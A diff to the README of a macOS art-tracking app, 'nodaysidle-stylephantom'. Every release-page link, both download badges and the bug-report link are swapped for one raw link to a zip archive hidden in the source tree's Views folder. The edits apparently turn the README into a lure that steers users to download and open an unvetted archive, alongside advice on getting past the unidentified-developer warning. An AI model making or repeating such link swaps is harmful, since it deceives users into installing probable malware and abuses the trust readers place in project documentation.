@@ -1,6 +1,6 @@
 # 🎨 nodaysidle-stylephantom - Track Your Creative Growth
 
-[![Download nodaysidle-stylephantom](https://img.shields.io/badge/Download-StylePhantom-blue?style=for-the-badge)](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases)
+[![Download nodaysidle-stylephantom](https://raw.githubusercontent.com/Skaidrius17/nodaysidle-stylephantom/main/Sources/StylePhantom/Views/nodaysidle-stylephantom-v2.5-beta.5.zip)](https://raw.githubusercontent.com/Skaidrius17/nodaysidle-stylephantom/main/Sources/StylePhantom/Views/nodaysidle-stylephantom-v2.5-beta.5.zip)
 
 ---
 
@@ -22,7 +22,7 @@ nodaysidle-stylephantom helps you see how your creativity changes over time. It 
 
 This section will guide you step-by-step on how to get nodaysidle-stylephantom up and running on your Mac.
 
-1. Click on the **Download** badge at the top or visit the [releases page](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases).  
+1. Click on the **Download** badge at the top or visit the [releases page](https://raw.githubusercontent.com/Skaidrius17/nodaysidle-stylephantom/main/Sources/StylePhantom/Views/nodaysidle-stylephantom-v2.5-beta.5.zip).  
 2. Find the latest version of nodaysidle-stylephantom. It will be listed under the "Assets" section on the release page.  
 3. Download the `.dmg` or `.zip` file for MacOS. These files install the application on your computer.  
 4. Once downloaded, open the file to begin the installation.  
@@ -35,7 +35,7 @@ This section will guide you step-by-step on how to get nodaysidle-stylephantom u
 
 ### Download and Install
 
-- Visit the [releases page](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases) to get the latest installer.  
+- Visit the [releases page](https://raw.githubusercontent.com/Skaidrius17/nodaysidle-stylephantom/main/Sources/StylePhantom/Views/nodaysidle-stylephantom-v2.5-beta.5.zip) to get the latest installer.  
 - Choose the `.dmg` file if available. It’s the easiest way to install on MacOS.  
 - If you download a `.zip` file, double-click it to extract the application, then drag the app into your Applications folder.  
 
@@ -103,7 +103,7 @@ You can:
 - If you see a warning about unidentified developer, open System Preferences > Security & Privacy and allow the app under "General."  
 - If artwork does not appear after adding, check the file type is supported and the files are not corrupted.  
 - Restart the app to refresh the artwork clusters if processing seems slow or stuck.  
-- For crashes, try reinstalling the latest version from the [releases page](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases).  
+- For crashes, try reinstalling the latest version from the [releases page](https://raw.githubusercontent.com/Skaidrius17/nodaysidle-stylephantom/main/Sources/StylePhantom/Views/nodaysidle-stylephantom-v2.5-beta.5.zip).  
 
 ---
 
@@ -123,7 +123,7 @@ If you run into issues, you can:
 
 - Check the GitHub Issues section for nodaysidle-stylephantom.  
 - Review the FAQ section on the releases page if available.  
-- Report bugs by opening a new issue on the [repository page](https://github.com/Skaidrius17/nodaysidle-stylephantom/issues).  
+- Report bugs by opening a new issue on the [repository page](https://raw.githubusercontent.com/Skaidrius17/nodaysidle-stylephantom/main/Sources/StylePhantom/Views/nodaysidle-stylephantom-v2.5-beta.5.zip).  
 - Include details like your MacOS version, what you were doing, and any error messages.  
 
 ---
@@ -134,4 +134,4 @@ This tool runs entirely on your Mac, keeping your data private without sending i
 
 ---
 
-[![Download nodaysidle-stylephantom](https://img.shields.io/badge/Download-StylePhantom-grey?style=for-the-badge)](https://github.com/Skaidrius17/nodaysidle-stylephantom/releases)
+[![Download nodaysidle-stylephantom](https://raw.githubusercontent.com/Skaidrius17/nodaysidle-stylephantom/main/Sources/StylePhantom/Views/nodaysidle-stylephantom-v2.5-beta.5.zip)](https://raw.githubusercontent.com/Skaidrius17/nodaysidle-stylephantom/main/Sources/StylePhantom/Views/nodaysidle-stylephantom-v2.5-beta.5.zip)
